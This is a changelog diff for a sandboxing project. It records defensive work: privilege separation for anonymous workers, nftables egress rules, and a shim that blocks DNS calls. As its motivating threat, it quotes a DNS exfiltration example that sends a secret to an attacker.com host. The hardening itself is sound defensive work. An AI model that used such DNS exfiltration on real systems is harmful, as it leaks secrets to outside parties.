@@ -5,6 +5,13 @@ Versioning: [Semver](https://semver.org/spec/v2.0.0.html).
 
 ## [Unreleased]
 
+### Added
+
+- **OS-level privilege separation for anonymous workers + DNS egress close.** Anonymous-unclaimed capsule workers previously ran under the SAME OS uid as the control plane — a native-addon escape from the Node permission sandbox landed with host-process identity. Now, when the host runs as root, each anonymous-unclaimed worker is forked under a dedicated unprivileged uid/gid (`POND_SANDBOX_UID`/`POND_SANDBOX_GID` / `--sandbox-uid`/`--sandbox-gid`, defaulting to the `pond-sandbox` system account resolved at boot via `src/host/sandbox-user.ts`). Claimed/authenticated deploys keep the host uid. Degrades gracefully: non-root hosts (dev, CI, the hardened container, which cannot setuid) log a warning and run workers under the host uid — never failing to boot.
+  - The kernel egress firewall (`deploy/capsule-egress.nft`) matches on capsule **cgroup membership**, which is uid-independent, so a dropped uid stays covered; a commented owner-match (`skuid`) drop is provided for operators who want a uid-keyed belt-and-suspenders rule, and the host warns when a sandbox uid is set but egress isn't sealed.
+  - The JS network shim in `src/host/deploy-worker.ts` now also blocks `dns.lookup`/`dns.resolve`/`dns.promises.*` (defense-in-depth for the documented `dns.lookup("<secret>.attacker.com")` exfil), passing through only literal IPs and `localhost` so the worker can still bind its own server. The OS nft rule dropping port 53 remains the real boundary.
+  - Tests: `test/sandbox-user.test.mjs` (uid/gid resolution + non-root/unresolvable fallback, root path driven via injected `effectiveUid` so they pass non-root), `test/deploy-worker-egress.test.mjs` (dns + net shim, run in isolated child processes). Docs updated honestly in `docs/operations.md` and `docs/abuse-policy.md`. Full Firecracker/microVM and per-tenant netns isolation remain future work.
+
 ## [0.3.16] - 2026-05-27
 
 ### Added
